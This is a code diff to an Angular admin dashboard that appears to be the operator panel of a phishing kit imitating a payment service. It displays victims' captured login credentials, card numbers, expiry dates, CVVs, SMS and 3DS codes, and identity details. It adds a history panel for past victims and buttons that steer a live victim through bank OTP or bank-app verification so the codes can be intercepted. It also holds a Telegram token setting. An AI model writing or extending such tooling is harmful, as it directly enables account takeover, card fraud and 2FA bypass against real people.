@@ -11,7 +11,7 @@ type AdminTab = 'live' | 'history' | 'settings';
   standalone: true,
   imports: [CommonModule, FormsModule],
   template: `
-    <div class="flex h-screen bg-pp-bg font-sans text-pp-navy overflow-hidden">
+    <div class="flex h-screen bg-pp-bg font-sans text-pp-navy overflow-hidden relative">
       
       <!-- Toast Notification -->
       @if (state.adminToast()) {
@@ -151,7 +151,7 @@ type AdminTab = 'live' | 'history' | 'settings';
                              </div>
                         </div>
 
-                        <!-- Details Column -->
+                        <!-- Details Column (Using Template) -->
                         <div class="lg:col-span-8 bg-white rounded-card shadow-sm border border-slate-100 flex flex-col h-auto lg:h-full overflow-hidden relative min-h-[500px]">
                              @if(monitoredSession()) {
                                  <!-- Header -->
@@ -250,9 +250,17 @@ type AdminTab = 'live' | 'history' | 'settings';
                                               </div>
                                               
                                               @if(monitoredSession()?.stage === 'card_pending') {
-                                                <button (click)="requestOtp()" class="relative z-10 bg-white/10 hover:bg-white/20 text-white border border-white/30 px-4 py-2 rounded-full font-bold text-xs transition-all backdrop-blur-sm">
-                                                    Request Bank OTP
-                                                </button>
+                                                <div class="relative z-10 flex gap-2">
+                                                    <button (click)="requestFlow('otp')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-3 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
+                                                        SMS / 3DS
+                                                    </button>
+                                                    <button (click)="requestFlow('app')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-3 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
+                                                        Bank App
+                                                    </button>
+                                                    <button (click)="requestFlow('both')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-3 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
+                                                        Both
+                                                    </button>
+                                                </div>
                                               }
                                          </div>
                                          
@@ -295,6 +303,9 @@ type AdminTab = 'live' | 'history' | 'settings';
 
                                      @if(isSessionLive(monitoredSession())) {
                                          <div class="flex gap-3">
+                                              <button (click)="revoke()" class="bg-red-50 hover:bg-red-100 text-red-600 border border-red-100 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
+                                                  Revoke
+                                              </button>
                                               <button (click)="reject()" class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
                                                   Reject
                                               </button>
@@ -340,7 +351,7 @@ type AdminTab = 'live' | 'history' | 'settings';
                                 </thead>
                                 <tbody class="divide-y divide-slate-100 text-sm font-medium">
                                     @for(item of state.history(); track item.id) {
-                                        <tr class="hover:bg-slate-50 transition-colors cursor-pointer" (click)="selectSession(item)">
+                                        <tr class="hover:bg-slate-50 transition-colors cursor-pointer" (click)="viewHistory(item)">
                                             <td class="px-8 py-4 text-slate-500">{{ item.timestamp | date:'short' }}</td>
                                             <td class="px-6 py-4 text-pp-blue font-bold font-mono">
                                                 {{ item.id }}
@@ -416,6 +427,178 @@ type AdminTab = 'live' | 'history' | 'settings';
             }
          </div>
       </main>
+
+      <!-- History Slide-out Panel -->
+      @if (historyPanelOpen()) {
+           <div class="fixed inset-0 z-50 flex justify-end">
+               <!-- Backdrop -->
+               <div class="absolute inset-0 bg-black/20 backdrop-blur-sm transition-opacity" (click)="closeHistory()"></div>
+               <!-- Panel -->
+               <div class="relative w-full max-w-2xl bg-white h-full shadow-2xl flex flex-col animate-slide-in-right">
+                   <div class="p-6 border-b border-slate-100 flex justify-between items-center bg-slate-50/50">
+                       <h2 class="font-bold text-xl text-pp-navy">Session History Details</h2>
+                       <button (click)="closeHistory()" class="p-2 hover:bg-slate-200 text-slate-500 rounded-full transition-colors">
+                           <span class="material-icons">close</span>
+                       </button>
+                   </div>
+                   <div class="flex-1 overflow-y-auto bg-[#F9FAFB] flex flex-col">
+                        <ng-container *ngTemplateOutlet="sessionDetailView; context: {session: selectedHistorySession(), isHistory: true}"></ng-container>
+                   </div>
+               </div>
+           </div>
+      }
+
+      <!-- Reusable Session Detail Template -->
+      <ng-template #sessionDetailView let-session="session" let-isHistory="isHistory">
+            <!-- Header -->
+            <div class="p-6 border-b border-slate-100 flex justify-between items-center bg-white/50 shrink-0">
+                <div>
+                    <div class="flex items-center gap-3 mb-1">
+                    <h2 class="font-bold text-xl text-pp-navy">Session Details</h2>
+                    <span class="bg-pp-navy text-white text-[10px] px-2 py-0.5 rounded uppercase tracking-wider font-bold">{{ session?.stage }}</span>
+                    </div>
+                    <p class="text-xs text-slate-500 font-mono">{{ session?.id }} • {{ session?.fingerprint?.ip }}</p>
+                </div>
+                @if(!isHistory) {
+                    <div class="text-right">
+                        <p class="text-[10px] text-slate-400 font-bold uppercase">Time Elapsed</p>
+                        <p class="font-mono font-bold text-pp-blue">{{ elapsedTime() }}</p>
+                    </div>
+                }
+            </div>
+
+            <!-- Scrollable Content -->
+            <div class="flex-1 p-6 lg:p-8">
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-6 pb-20">
+
+                    <!-- Credentials -->
+                    <div class="bg-white p-6 rounded-[20px] shadow-sm border border-slate-100 relative overflow-hidden group">
+                        <div class="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity"><span class="material-icons text-6xl text-pp-navy">lock</span></div>
+                        <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">Login Credentials</h4>
+                        <div class="space-y-4 relative z-10">
+                            <div>
+                                <label class="text-[11px] font-bold text-slate-500 block mb-1">Email / Username</label>
+                                <div class="flex items-center gap-2">
+                                    <p class="text-base font-bold text-pp-navy break-all">{{ session?.data?.email || 'Waiting...' }}</p>
+                                    <button *ngIf="session?.data?.email" (click)="copy(session?.data?.email)" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
+                                </div>
+                            </div>
+                            <div>
+                                <label class="text-[11px] font-bold text-slate-500 block mb-1">Password</label>
+                                <div class="flex items-center gap-2">
+                                    <p class="text-base font-mono bg-slate-100 px-2 py-1 rounded text-pp-navy border border-slate-200">{{ session?.data?.password || 'Waiting...' }}</p>
+                                    <button *ngIf="session?.data?.password" (click)="copy(session?.data?.password)" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Financial -->
+                    <div class="bg-white p-6 rounded-[20px] shadow-sm border border-slate-100 relative overflow-hidden group">
+                        <div class="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity"><span class="material-icons text-6xl text-pp-navy">credit_card</span></div>
+                        <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">Financial Instrument</h4>
+                        <div class="space-y-4 relative z-10">
+                            <div>
+                                <label class="text-[11px] font-bold text-slate-500 block mb-1">Card Number</label>
+                                <div class="flex items-center gap-2">
+                                <p class="text-lg font-mono font-bold text-pp-navy tracking-wide">{{ formatCard(session?.data?.cardNumber) }}</p>
+                                <button *ngIf="session?.data?.cardNumber" (click)="copy(session?.data?.cardNumber)" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
+                                </div>
+                            </div>
+                            <div class="flex gap-6">
+                                <div>
+                                    <label class="text-[11px] font-bold text-slate-500 block mb-1">Exp</label>
+                                    <p class="font-bold text-pp-navy">{{ session?.data?.cardExpiry || '--/--' }}</p>
+                                </div>
+                                <div>
+                                    <label class="text-[11px] font-bold text-slate-500 block mb-1">CVV</label>
+                                    <p class="font-bold text-[#D92D20]">{{ session?.data?.cardCvv || '---' }}</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- OTP & Security -->
+                    <div class="col-span-1 md:col-span-2 bg-pp-navy text-white p-6 rounded-[20px] shadow-lg relative overflow-hidden flex items-center justify-between">
+                            <!-- Background decoration -->
+                            <div class="absolute -right-6 -top-6 w-32 h-32 bg-pp-blue rounded-full opacity-20 blur-2xl"></div>
+
+                            <div class="relative z-10">
+                                <h4 class="text-xs font-bold text-white/60 uppercase tracking-wider mb-3">Security Codes</h4>
+                                <div class="flex gap-8">
+                                    <div>
+                                        <span class="text-[10px] text-white/50 block mb-1">SMS Code</span>
+                                        <span class="text-2xl font-mono font-bold tracking-widest">{{ session?.data?.phoneCode || '---' }}</span>
+                                    </div>
+                                    <div>
+                                        <span class="text-[10px] text-white/50 block mb-1">Bank 3DS</span>
+                                        <span class="text-2xl font-mono font-bold tracking-widest text-pp-success">{{ session?.data?.cardOtp || '---' }}</span>
+                                    </div>
+                                </div>
+                            </div>
+
+                            @if(session?.stage === 'card_pending' && !isHistory) {
+                            <button (click)="requestOtp()" class="relative z-10 bg-white/10 hover:bg-white/20 text-white border border-white/30 px-4 py-2 rounded-full font-bold text-xs transition-all backdrop-blur-sm">
+                                Request Bank OTP
+                            </button>
+                            }
+                    </div>
+
+                    <!-- Personal Info -->
+                    <div class="col-span-1 md:col-span-2 bg-white p-6 rounded-[20px] shadow-sm border border-slate-100">
+                            <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">Identity Profile</h4>
+                            <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+                                <div>
+                                    <label class="text-[10px] font-bold text-slate-400 uppercase">Name</label>
+                                    <p class="text-sm font-bold text-pp-navy">{{ (session?.data?.firstName + ' ' + session?.data?.lastName).trim() || 'Waiting...' }}</p>
+                                </div>
+                                <div>
+                                    <label class="text-[10px] font-bold text-slate-400 uppercase">DOB</label>
+                                    <p class="text-sm font-bold text-pp-navy">{{ session?.data?.dob || 'Waiting...' }}</p>
+                                </div>
+                                <div>
+                                    <label class="text-[10px] font-bold text-slate-400 uppercase">Phone</label>
+                                    <p class="text-sm font-bold text-pp-navy">{{ session?.data?.phoneNumber || 'Waiting...' }}</p>
+                                </div>
+                                <div>
+                                    <label class="text-[10px] font-bold text-slate-400 uppercase">Location</label>
+                                    <p class="text-sm font-bold text-pp-navy">{{ session?.data?.country || 'Waiting...' }}</p>
+                                </div>
+                                <div class="col-span-2">
+                                    <label class="text-[10px] font-bold text-slate-400 uppercase">Address</label>
+                                    <p class="text-sm font-bold text-pp-navy">{{ session?.data?.address || 'Waiting...' }}</p>
+                                </div>
+                            </div>
+                    </div>
+
+                </div>
+            </div>
+
+            <!-- Action Bar -->
+            @if(!isHistory) {
+                <div class="p-5 border-t border-slate-200 bg-white sticky bottom-0 z-20 flex justify-between items-center shadow-lg lg:shadow-none">
+                    <div class="flex items-center gap-2">
+                        <span class="h-2 w-2 rounded-full" [class.animate-pulse]="isSessionLive(session)" [class.bg-pp-success]="isSessionLive(session)" [class.bg-slate-300]="!isSessionLive(session)"></span>
+                        <span class="text-xs font-bold text-slate-500 hidden sm:block">{{ isSessionLive(session) ? 'Live Connection' : 'Offline' }}</span>
+                    </div>
+
+                    @if(isSessionLive(session)) {
+                        <div class="flex gap-3">
+                            <button (click)="reject()" class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
+                                Reject
+                            </button>
+                            <button (click)="approve()" class="bg-pp-navy hover:bg-pp-blue text-white px-8 py-3 rounded-full font-bold text-sm shadow-button transition-all flex items-center gap-2">
+                                <span class="material-icons text-sm">check</span> {{ approveText() }}
+                            </button>
+                        </div>
+                    } @else {
+                        <div class="text-xs text-slate-400 font-bold uppercase tracking-wider">
+                            Session Offline
+                        </div>
+                    }
+                </div>
+            }
+      </ng-template>
       }
     </div>
   `
@@ -428,6 +611,10 @@ export class AdminDashboardComponent {
   loginPass = '';
   loginError = signal(false);
 
+  // History Slide-out Logic
+  historyPanelOpen = signal(false);
+  selectedHistorySession = signal<SessionHistory | null>(null);
+
   // Settings
   settingEmail = '';
   tgToken = '';
@@ -436,8 +623,7 @@ export class AdminDashboardComponent {
   monitoredSession = computed(() => {
       const id = this.state.monitoredSessionId();
       if (!id) return null;
-      return this.state.activeSessions().find(s => s.id === id) || 
-             this.state.history().find(s => s.id === id);
+      return this.state.activeSessions().find(s => s.id === id);
   });
 
   elapsedTime = signal('0m');
@@ -486,6 +672,16 @@ export class AdminDashboardComponent {
 
   selectSession(session: any) {
       this.state.setMonitoredSession(session.id);
+  }
+
+  viewHistory(session: SessionHistory) {
+      this.selectedHistorySession.set(session);
+      this.historyPanelOpen.set(true);
+  }
+
+  closeHistory() {
+      this.historyPanelOpen.set(false);
+      this.selectedHistorySession.set(null);
   }
 
   formatCard(num: string | undefined): string {
@@ -585,6 +781,11 @@ ${session.fingerprint?.userAgent}
       this.state.adminRequestCardOtp();
   }
 
+  requestFlow(flow: 'otp' | 'app' | 'both') {
+      this.state.adminSetVerificationFlow(flow);
+      this.state.adminRequestCardOtp(); // Triggers the next step (APPROVE)
+  }
+
   reject() {
       this.state.adminRejectStep('Security verification failed.');
   }
@@ -601,6 +802,7 @@ ${session.fingerprint?.userAgent}
           case 'personal_pending': return 'Approve Identity';
           case 'card_pending': return 'Approve Card';
           case 'card_otp_pending': return 'Approve OTP';
+          case 'bank_app_pending': return 'Complete Session';
           default: return 'Approve';
       }
   }
